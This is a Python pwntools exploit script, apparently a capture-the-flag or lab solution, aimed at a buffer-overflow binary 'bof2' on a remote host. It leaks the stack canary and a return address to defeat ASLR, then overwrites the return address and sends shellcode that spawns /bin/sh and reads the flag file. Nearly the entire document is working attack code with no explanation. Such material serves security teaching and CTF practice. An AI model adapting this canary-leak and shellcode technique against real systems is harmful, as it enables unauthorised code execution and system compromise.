#!/usr/bin/env python3

import pwn
import sys

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

exe = './bof2'
port = 10259

if __name__ == '__main__':
    r = None
    if 'local' in sys.argv[1:]:
        r = pwn.process(exe, shell=False)
    else:
        r = pwn.remote('up.zoolab.org', port)


    s = "What's your name? "
    p = r.recvuntil(s.encode()).decode()
    print(p)
    s = "1" * 0x29
    r.send(s.encode())

    s = "Welcome, "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x29 : 0x30]
    # print(len(p))
    p = b'\x00' + p
    p = p + b"\x00" * (8 - len(p))
    canary = pwn.u64(p)
    print("canary =", hex(canary))


    s = "What's the room number? "
    p = r.recvuntil(s.encode())
    print(p)
    s = "1" * 0x38
    r.send(s.encode())

    s = "The room number is: "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x38 : -1]
    print(p, len(p))
    p = p + b"\x00" * (8 - len(p))
    ret_addr = pwn.u64(p)
    main_addr = ret_addr - 0xA0
    print(p)
    elf = pwn.ELF(exe)
    base = main_addr - elf.symbols["main"]
    msg_addr = base + elf.symbols["msg"]
    print("msg_addr =", hex(msg_addr))


    s = "What's the customer's name? "
    p = r.recvuntil(s.encode())
    print(p)
    s = b"1" * 0x28 + pwn.p64(canary) + b"1" * 0x8 + pwn.p64(msg_addr)
    r.send(s)
    print(s)


    s = "Leave your message: "
    p = r.recvuntil(s.encode())
    print(p)
    code = pwn.asm('''
    sub %rsp, 8
                   
    mov %rax, 0x0068732F6E69622F
    mov [%rsp], %rax
                
    mov %rdi, %rsp
    mov %rsi, 0
    mov %rdx, 0
    mov %rax, 0x3b
    syscall
    
    add %rsp, 8
    ret
    ''')
    print(code)
    r.send(code)


    s = "cat /FLAG\n"
    r.send(s.encode())

    r.interactive()
